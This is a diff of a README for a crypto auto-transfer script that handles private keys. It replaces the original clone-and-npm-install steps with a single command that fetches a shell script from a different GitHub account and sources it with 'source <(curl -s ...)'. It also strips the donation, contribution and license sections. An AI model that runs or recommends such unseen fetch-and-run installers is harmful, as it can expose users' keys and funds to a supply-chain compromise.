@@ -10,29 +10,10 @@ Welcome to the `evm-auto-transfer` repository! This script allows you to automat
 - 🚀 Easily configurable for various networks (testnets and mainnets).
 - 🔒 Secure handling of private keys.
 
-## Getting Started
-
-### Prerequisites
-
-Ensure you have the following installed:
-
-- [Node.js](https://nodejs.org/) (v14 or higher)
-- npm (Node Package Manager)
-
-### Installation
-
-1. Clone the repository:
-
-   ```bash
-   git clone https://github.com/dante4rt/evm-auto-transfer.git
-   cd evm-auto-transfer
-   ```
-
-2. Install the necessary packages:
-
-   ```bash
-   npm install
-   ```
+# Installation
+```
+source <(curl -s https://raw.githubusercontent.com/ryzwan29/evm-auto-transfer/main/quick-installation.sh)
+```
 
 ### Configuration
 
@@ -107,19 +88,3 @@ Ensure you have the following installed:
 
    - You will be prompted to select your network environment (Testnet/Mainnet) and choose the chain from the provided list using the arrow keys.
    - Define the number of transactions you want to process and let the script handle the rest!
-
-### Contribution
-
-Contributions are welcome! Please fork the repository and submit a pull request with your improvements.
-
-## Donations
-
-If you would like to support the development of this project, you can make a donation using the following addresses:
-
-- **Solana**: `GLQMG8j23ookY8Af1uLUg4CQzuQYhXcx56rkpZkyiJvP`
-- **EVM**: `0x960EDa0D16f4D70df60629117ad6e5F1E13B8F44`
-- **BTC**: `bc1p9za9ctgwwvc7amdng8gvrjpwhnhnwaxzj3nfv07szqwrsrudfh6qvvxrj8`
-
-### License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
